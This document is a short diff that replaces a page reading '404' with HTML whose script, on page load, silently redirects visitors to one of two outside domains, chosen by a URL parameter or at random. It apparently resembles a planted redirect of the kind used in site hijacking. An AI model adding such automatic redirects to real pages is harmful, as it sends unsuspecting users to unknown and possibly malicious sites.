@@ -1,1 +1,25 @@
-404
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+</head>
+<body>
+<script language="javascript">
+    function dogo() {
+        var urls = {
+            "mobi": "https://dhw.mobi",
+            "shop": "https://dhwz.shop"
+        };
+        var urlParam = new URLSearchParams(window.location.search).get('url');
+        if (urlParam && urls.hasOwnProperty(urlParam)) {
+            window.location.href = urls[urlParam];
+        } else {
+            var randomIndex = Math.floor(Math.random() * Object.keys(urls).length);
+            var randomKey = Object.keys(urls)[randomIndex];
+            window.location.href = urls[randomKey]; 
+        }
+    }
+    window.addEventListener('load', dogo);
+</script>
+</body>
+</html>
